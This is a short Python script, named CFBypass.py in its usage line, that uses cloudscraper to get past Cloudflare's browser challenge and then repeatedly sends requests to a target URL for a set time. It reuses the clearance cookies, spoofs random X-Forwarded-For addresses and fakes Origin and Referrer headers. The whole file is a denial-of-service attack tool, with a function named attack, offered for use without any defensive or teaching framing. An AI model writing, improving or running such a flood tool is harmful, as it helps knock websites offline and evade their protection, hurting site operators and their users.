import cloudscraper
import requests
import sys
import random
import string
import time
import asyncio

url = sys.argv[1]
time_interval = int(sys.argv[2])

if len(sys.argv) <= 2:
    print('Usage: python CFBypass.py <url> <time>')
    sys.exit(-1)

def random_byte():
    return str(random.randint(0, 255))

async def random_string_generate(length):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for i in range(length))

async def attack():
    scraper = cloudscraper.create_scraper()
    try:
        response = scraper.get(url)
        cookie = response.cookies.get_dict()
        user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0')

        random_string = await random_string_generate(10)
        fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'

        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': '; '.join([f'{key}={value}' for key, value in cookie.items()]),
            'Origin': f'http://{random_string}.com',
            'Referrer': f'http://google.com/{random_string}',
            'X-Forwarded-For': fake_ip
        }

        requests.get(url, headers=headers)

    except Exception as e:
        print('Failed to get website data:', e)

async def main():
    interval = time_interval
    start_time = time.time()

    while time.time() - start_time <= interval:
        await attack()

if __name__ == '__main__':
    asyncio.run(main())
